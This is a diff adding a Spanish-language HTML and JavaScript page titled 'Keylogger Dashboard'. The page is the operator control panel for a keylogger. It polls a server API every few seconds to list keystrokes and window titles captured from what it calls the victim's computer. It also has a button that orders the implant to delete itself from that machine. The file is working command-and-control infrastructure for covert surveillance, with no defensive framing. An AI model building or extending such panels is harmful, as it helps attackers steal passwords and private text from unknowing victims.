@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keylogger Dashboard</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&display=swap" rel="stylesheet">
+    
+    <style>
+        body {
+            background-color: #121212;
+            color: #e0e0e0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        .card {
+            background-color: #1e1e1e;
+            border: 1px solid #333;
+        }
+        .table-dark {
+            --bs-table-bg: #1e1e1e;
+            --bs-table-border-color: #333;
+        }
+        /* Color verde hacker para teclas */
+        .keystroke-cell {
+            font-family: 'Fira Code', monospace;
+            color: #00ff41; 
+            white-space: pre-wrap; 
+            font-size: 0.9rem;
+        }
+        /* NUEVO: Color azul cian claro para la hora */
+        .time-cell {
+            color: #66d9ef;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+        }
+        .window-badge {
+            font-size: 0.8rem;
+            background-color: #2d2d44;
+            color: #fff;
+            padding: 5px 10px;
+            border-radius: 4px;
+            border: 1px solid #444;
+        }
+        .header-title {
+            color: #00ff41;
+            font-weight: bold;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        tr { animation: fadeIn 0.5s; }
+    </style>
+</head>
+<body>
+
+<div class="container mt-5">
+    <div class="d-flex justify-content-between align-items-center mb-4">
+        <h2 class="header-title">⌨️ Log Monitor</h2>
+        <div>
+            <span id="status" class="badge bg-secondary me-2">Desconectado</span>
+            <button class="btn btn-outline-success btn-sm me-2" onclick="fetchLogs()">Actualizar ahora</button>
+            <!-- BOTÓN DE ELIMINAR CLIENTE -->
+            <button class="btn btn-danger btn-sm" onclick="triggerKill()">💀 ELIMINAR CLIENTE</button>
+        </div>
+    </div>
+
+    <div class="card shadow-lg">
+        <div class="card-body p-0">
+            <div class="table-responsive">
+                <table class="table table-dark table-hover mb-0 align-middle">
+                    <thead>
+                        <tr class="text-white border-bottom border-secondary">
+                            <th scope="col" style="width: 20%">Hora</th>
+                            <th scope="col" style="width: 25%">Ventana / Aplicación</th>
+                            <th scope="col" style="width: 55%">Teclas Capturadas</th>
+                        </tr>
+                    </thead>
+                    <tbody id="logs-body">
+                        <tr>
+                            <td colspan="3" class="text-center py-4">Cargando datos...</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    async function fetchLogs() {
+        const statusBadge = document.getElementById('status');
+        try {
+            const response = await fetch('/api/get_logs');
+            if (!response.ok) throw new Error('Error en red');
+            
+            const logs = await response.json();
+            const tbody = document.getElementById('logs-body');
+            tbody.innerHTML = ''; 
+
+            logs.forEach(log => {
+                const date = new Date(log.timestamp).toLocaleString();
+
+                const row = `
+                    <tr>
+                        <td class="time-cell">${date}</td>
+                        <td>
+                            <div class="window-badge text-truncate" style="max-width: 250px;">
+                                ${escapeHtml(log.window_title)}
+                            </div>
+                        </td>
+                        <td class="keystroke-cell">${escapeHtml(log.keystrokes)}</td>
+                    </tr>
+                `;
+                tbody.innerHTML += row;
+            });
+
+            statusBadge.textContent = "Conectado · Auto-refresco";
+            statusBadge.className = "badge bg-success me-2";
+
+        } catch (error) {
+            console.error('Error fetching logs:', error);
+            statusBadge.textContent = "Error de conexión";
+            statusBadge.className = "badge bg-danger me-2";
+        }
+    }
+
+    async function triggerKill() {
+        if (!confirm("⚠️ ¿ESTÁS SEGURO?\n\nEsto enviará una orden al keylogger para que se borre a sí mismo del ordenador víctima y se cierre permanentemente.")) {
+            return;
+        }
+        
+        try {
+            const response = await fetch('/api/kill_toggle', { method: 'POST' });
+            const data = await response.json();
+            alert("ALERTA: " + data.message + "\nEl cliente se borrará en su próxima conexión.");
+        } catch (error) {
+            alert("Error al conectar con el servidor.");
+        }
+    }
+
+    function escapeHtml(text) {
+        if (!text) return "";
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    fetchLogs();
+    setInterval(fetchLogs, 3000);
+</script>
+
+</body>
+</html>
